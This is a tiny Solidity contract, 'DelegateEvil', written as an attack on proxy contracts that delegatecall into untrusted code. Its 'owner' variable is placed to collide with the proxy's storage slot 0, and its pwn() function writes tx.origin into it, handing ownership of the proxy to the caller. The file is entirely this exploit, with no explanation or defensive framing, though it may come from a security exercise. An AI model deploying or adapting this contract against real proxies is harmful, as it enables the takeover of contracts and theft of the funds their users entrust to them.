// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract DelegateEvil {
    address public owner; // aligns with Proxy slot 0
    function pwn() external { owner = tx.origin; }
}